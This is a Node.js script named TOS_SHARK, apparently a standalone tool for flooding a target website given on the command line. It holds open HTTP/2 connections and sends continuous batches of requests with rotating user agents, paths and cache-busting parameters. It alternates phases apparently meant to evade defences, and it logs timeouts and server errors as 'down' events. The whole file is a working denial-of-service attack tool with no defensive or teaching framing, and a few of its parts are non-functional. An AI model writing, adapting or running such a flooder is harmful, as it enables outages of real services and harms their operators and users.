const http2 = require('http2');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.target = target;
        this.running = true;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.lastPhaseChange = Date.now();
        this.phaseDuration = 120000 + Math.random() * 100000; // 120-220s
        
        // Connections
        this.conns = [];
        
        // Headers & Fingerprints
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ];
        
        this.paths = ['/', '/api', '/static', '/admin', '/users', '/data', '/v1', '/v2'];
        this.methods = ['GET', 'HEAD', 'POST'];
        
        // Print header once
        console.log(`TØS-SHARK | *.* | MT-3M22`);
        console.log('-----------------------------------------------------------------');
        
        this.start();
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
        return `${colors[c] || ''}${t}${colors.x}`;
    }

    start() {
        // Setup connections
        for (let i = 0; i < 10; i++) {
            try {
                const client = http2.connect(this.target);
                client.setMaxListeners(1000);
                this.conns.push(client);
            } catch (e) {}
        }
        
        console.log(this.color(`[+] ${this.conns.length} connections`, 'g'));
        
        // Start attack
        this.attackLoop();
        
        process.on('SIGINT', () => {
            this.running = false;
            this.conns.forEach(c => c.destroy());
            process.exit(0);
        });
    }

    getRandomPath() {
        return this.paths[Math.floor(Math.random() * this.paths.length)];
    }

    getRandomMethod() {
        return this.methods[Math.floor(Math.random() * this.methods.length)];
    }

    getRandomHeaders() {
        return {
            'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache'
        };
    }

    async attackLoop() {
        while (this.running) {
            // Check for phase change
            const now = Date.now();
            if (now - this.lastPhaseChange > this.phaseDuration) {
                this.lastPhaseChange = now;
                this.phaseDuration = 19000 + Math.random() * 3000; // 19-22s H1 phase
                
                // H1 Phase - send minimal requests
                for (let i = 0; i < 20; i++) {
                    this.totalReqs++;
                    this.reqCounter++;
                    await new Promise(r => setTimeout(r, 50));
                }
                
                // Back to H2
                this.lastPhaseChange = now;
                this.phaseDuration = 120000 + Math.random() * 100000;
                continue;
            }
            
            if (this.conns.length === 0) {
                await new Promise(r => setTimeout(r, 100));
                continue;
            }
            
            // Send 100 requests per tick
            for (let i = 0; i < 100; i++) {
                const client = this.conns[Math.floor(Math.random() * this.conns.length)];
                
                try {
                    const method = this.getRandomMethod();
                    const path = this.getRandomPath();
                    const headers = this.getRandomHeaders();
                    
                    const req = client.request({
                        ':method': method,
                        ':path': `${path}?t=${Date.now()}&r=${this.reqCounter}`,
                        ':authority': this.host,
                        ...headers
                    });
                    
                    this.reqCounter++;
                    this.totalReqs++;
                    
                    req.on('response', (headers) => {
                        const status = headers[':status'];
                        this.logStatus(status);
                    });
                    
                    req.on('error', (err) => {
                        if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || err.code === 'ETIMEDOUT') {
                            this.logStatus('TIMEOUT');
                        } else {
                            this.logStatus('ERROR');
                        }
                    });
                    
                    if (method === 'POST') {
                        req.write('');
                    }
                    
                    req.end();
                    
                } catch (e) {
                    this.totalReqs++;
                    this.reqCounter++;
                }
            }
            
            await new Promise(r => setTimeout(r, 0.1));
        }
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 5000) {
            this.lastLog = now;
            
            let color = 'g';
            let text = status;
            
            if (status === 'TIMEOUT') {
                color = 'r';
                text = 'TIMEOUT';
            } else if (status === 'ERROR') {
                color = 'r';
                text = 'ERROR';
            } else if (status >= 500) {
                color = 'r';
                text = status;
            } else if (status >= 400) {
                color = 'y';
                text = status;
            } else if (status >= 300) {
                color = 'b';
                text = status;
            }
            
            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
            
            // Down event (only for TIMEOUT or 5xx)
            if ((status === 'TIMEOUT' || (typeof status === 'number' && status >= 500)) && color === 'r') {
                console.log(this.color(`{3M22-${this.reqCounter} --> ${text}}`, 'r'));
            }
        }
    }
}

// Run
if (require.main === module) {
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    new TOS_SHARK(process.argv[2]);
                }
